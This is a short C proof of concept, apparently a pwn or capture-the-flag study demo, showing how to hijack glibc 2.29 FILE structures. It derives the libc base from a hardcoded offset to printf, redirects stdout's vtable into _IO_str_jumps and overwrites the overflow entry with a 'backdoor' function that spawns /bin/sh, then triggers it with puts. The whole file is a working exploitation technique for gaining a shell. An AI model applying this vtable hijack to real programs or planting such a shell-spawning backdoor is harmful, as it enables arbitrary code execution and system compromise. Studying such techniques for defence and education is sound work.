#include <stdio.h>
#include <stdlib.h>

// Testing with libc-2.29
// gcc overwrite_iovtables.c -o overwrite_iovtables

// typedef struct {
//     int _flags;
//     char *_IO_read_ptr;
//     char *_IO_read_end;
//     char *_IO_read_base;
//     char *_IO_write_base;
//     char *_IO_write_ptr;
//     char *_IO_write_end;
//     char *_IO_buf_base;
//     char *_IO_buf_end;
//     char *_IO_save_base;
//     char *_IO_backup_base;
//     char *_IO_save_end;
//     void *_markers;
//     void *_chain;
//     int _fileno;
// } _IO_FILE;

void backdoor(void)
{
    system("/bin/sh");
}

int main(void)
{
    char *p;
    void **vtable;
    void *libc;
    void **_IO_str_jumps;
    void **_s;

    libc = (char *)printf - 0x62830;
    _IO_str_jumps = (char *)libc + 0x1e6620;

    p = stdout;
    vtable = (void *)&p[0xd8];

    // Set vtable[7] = _IO_str_jumps.overflow
    *vtable = _IO_str_jumps + 3 - 7;
    // Overwrite _IO_str_jumps.overflow to backdoor
    _IO_str_jumps[3] = backdoor;

    // Call vtable[7] --> call backdoor
    puts("Demo");
}
